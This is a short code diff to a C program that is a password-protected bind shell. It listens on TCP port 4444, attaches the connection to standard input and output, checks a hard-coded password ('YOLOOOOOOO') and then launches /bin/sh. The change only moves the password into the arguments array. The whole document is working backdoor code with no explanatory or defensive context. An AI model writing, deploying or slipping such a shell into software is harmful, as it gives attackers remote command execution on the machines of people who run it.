@@ -11,9 +11,9 @@ int main()
         int sock;
         int new_sock;
         int sockaddr_len = sizeof(struct sockaddr_in);
-        char *arguments[] = { "/bin/sh", 0, "4444" };
+        // Change arguments as required - last argument is password
+        char *arguments[] = { "/bin/sh", 0, "4444", "YOLOOOOOOO" };
         char buf[16];
-        char pass[] = "YOLOOOOOOO";
 
         sock = socket(AF_INET, SOCK_STREAM, 0);
 
@@ -32,9 +32,10 @@ int main()
         dup2(new_sock, 0);
         dup2(new_sock, 1);
         dup2(new_sock, 2);
+        
         read(new_sock, buf, 16);
         buf[strcspn(buf, "\n")] = 0;
-        if (strcmp(pass, buf) == 0)
+        if (strcmp(arguments[3], buf) == 0)
         {
                 execve(arguments[0], &arguments[0], NULL);
         }
